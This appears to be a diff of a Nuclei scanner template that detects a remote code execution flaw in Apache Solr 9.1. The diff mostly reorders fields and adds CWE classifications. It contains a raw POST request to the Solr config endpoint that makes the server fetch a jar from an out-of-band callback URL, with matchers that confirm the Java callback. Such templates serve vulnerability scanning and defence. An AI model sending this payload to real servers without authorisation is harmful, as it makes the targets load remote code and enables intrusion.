@@ -1,5 +1,4 @@
 id: apache-solr-rce
-
 info:
   name: Apache Solr 9.1 - Remote Code Execution
   author: j4vaovo
@@ -7,13 +6,27 @@ info:
   description: Apache Solr 9.1 is vulnerable to RCE.
   reference:
     - https://web.archive.org/web/20230414152023/https://noahblog.360.cn/apache-solr-rce/
+  classification:
+    cwe-id:
+      - CWE-15
+      - CWE-94
+      - CWE-99
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive, uses interactsh
     max-request: 2
-  tags: solr,apache,rce,oast,intrusive,vuln
-
+  tags: apache,intrusive,oast,rce,solr,vuln
 http:
-  - raw:
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - http
+      - part: interactsh_request
+        type: word
+        words:
+          - 'User-Agent: Java'
+    matchers-condition: and
+    raw:
       - |
         POST /solr/gettingstarted_shard1_replica_n1/config HTTP/1.1
         Host: {{Hostname}}
@@ -30,16 +43,3 @@ http:
 
         jar:http://{{interactsh-url}}/test.jar?!/Test.class
         --------------------------5897997e44b07bf9--
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
-
-      - type: word
-        part: interactsh_request
-        words:
-          - "User-Agent: Java"
-
